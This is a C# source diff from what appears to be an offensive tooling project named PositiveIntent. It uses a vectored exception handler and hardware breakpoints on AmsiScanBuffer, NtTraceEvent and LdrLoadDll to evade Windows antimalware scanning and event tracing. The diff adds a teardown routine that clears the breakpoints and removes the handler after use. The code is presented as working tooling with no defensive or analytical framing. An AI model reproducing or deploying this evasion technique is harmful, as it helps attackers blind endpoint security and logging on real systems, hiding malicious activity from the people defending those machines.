@@ -17,6 +17,8 @@ namespace PositiveIntent
         const uint STATUS_DLL_NOT_FOUND = 0xc0000135;
 
         static bool breakpointsSet = false;
+        static bool clearRequested = false;
+        static IntPtr vehHandle = IntPtr.Zero;
 
         [ThreadStatic]
         static bool _inDr0Handler;
@@ -66,6 +68,9 @@ namespace PositiveIntent
         delegate IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate uint RemoveVectoredExceptionHandlerDelegate(IntPtr handle);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate uint VectoredExceptionHandler(ref EXCEPTION_POINTERS exceptionInfo);
         static VectoredExceptionHandler handlerDelegate = new VectoredExceptionHandler(VEHCallback);
 
@@ -76,37 +81,48 @@ namespace PositiveIntent
             CONTEXT context = Marshal.PtrToStructure<CONTEXT>(exceptionInfo.ContextRecord);
 
             // Catch division by zero and set hardware breakpoint
-            if (exRecord.ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO && !breakpointsSet)
+            if (exRecord.ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)
             {
-                // Get target function address
-                IntPtr ntdllBaseAddress = Generic.GetLoadedModuleAddress("ntdll.dll");
-                IntPtr amsiBaseAddress = Generic.GetLoadedModuleAddress("amsi.dll");
-                IntPtr ldrLoadDll = Generic.GetExportAddress(ntdllBaseAddress, "LdrLoadDll");
-                IntPtr ntTraceEvent = Generic.GetExportAddress(ntdllBaseAddress, "NtTraceEvent");
-
-                // Set hardware breakpoints
-                context.Dr0 = (ulong)ldrLoadDll;
-                context.Dr1 = (ulong)ntTraceEvent;
-
-                // Edge case to account for reflective loading e.g. in PowerShell where amsi.dll is already loaded
-                if (amsiBaseAddress != IntPtr.Zero)
+                if (!breakpointsSet)
                 {
-                    IntPtr amsiScanBuffer = Generic.GetExportAddress(amsiBaseAddress, "AmsiScanBuffer");
-                    context.Dr2 = (ulong)amsiScanBuffer;
+                    // Get target function address
+                    IntPtr ntdllBaseAddress = Generic.GetLoadedModuleAddress("ntdll.dll");
+                    IntPtr amsiBaseAddress = Generic.GetLoadedModuleAddress("amsi.dll");
+                    IntPtr ldrLoadDll = Generic.GetExportAddress(ntdllBaseAddress, "LdrLoadDll");
+                    IntPtr ntTraceEvent = Generic.GetExportAddress(ntdllBaseAddress, "NtTraceEvent");
+
+                    // Set hardware breakpoints
+                    context.Dr0 = (ulong)ldrLoadDll;
+                    context.Dr1 = (ulong)ntTraceEvent;
+
+                    // Edge case to account for reflective loading e.g. in PowerShell where amsi.dll is already loaded
+                    if (amsiBaseAddress != IntPtr.Zero)
+                    {
+                        IntPtr amsiScanBuffer = Generic.GetExportAddress(amsiBaseAddress, "AmsiScanBuffer");
+                        context.Dr2 = (ulong)amsiScanBuffer;
+                    }
+
+                    // Configure Dr7
+                    // Set bits 0 (L0), 2 (L1), and 4 (L2) to 1 to enable enable Dr0, Dr1, Dr2 debug registers
+                    context.Dr7 = 0x1 | 0x4 | 0x10;
+
+                    // Mark that we want debug registers updated
+                    context.ContextFlags |= CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL | CONTEXT_INTEGER;
+
+                    // Write modified context back
+                    Marshal.StructureToPtr(context, exceptionInfo.ContextRecord, false);
+
+                    breakpointsSet = true;
                 }
+                else if (clearRequested)
+                {
+                    context.Dr0 = 0; context.Dr1 = 0; context.Dr2 = 0;
+                    context.Dr6 = 0; context.Dr7 = 0;
+                    context.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
+                    Marshal.StructureToPtr(context, exceptionInfo.ContextRecord, false);
+                    breakpointsSet = false;
 
-                // Configure Dr7
-                // Set bits 0 (L0), 2 (L1), and 4 (L2) to 1 to enable enable Dr0, Dr1, Dr2 debug registers
-                context.Dr7 = 0x1 | 0x4 | 0x10;
-
-                // Mark that we want debug registers updated
-                context.ContextFlags |= CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL | CONTEXT_INTEGER;
-
-                // Write modified context back
-                Marshal.StructureToPtr(context, exceptionInfo.ContextRecord, false);
-
-                breakpointsSet = true;
-
+                }
                 return EXCEPTION_CONTINUE_SEARCH;
             }
 
@@ -197,6 +213,19 @@ namespace PositiveIntent
             // Exception not a SINGLE_STEP
             // Don't consume it — pass to the next handler.
             return EXCEPTION_CONTINUE_SEARCH;
+        }
+
+        public static void Teardown()
+        {
+            clearRequested = true;
+            try { int x = 1, y = 0, _ = x / y; } catch (DivideByZeroException) { }
+
+            if (vehHandle != IntPtr.Zero)
+            {
+                object[] parameters = new object[] { vehHandle };
+                Generic.DynamicApiInvoke<uint>("kernel32.dll", "RemoveVectoredExceptionHandler", typeof(RemoveVectoredExceptionHandlerDelegate), ref parameters);
+                vehHandle = IntPtr.Zero;
+            }
         }
 
         public static void SetupHandler()
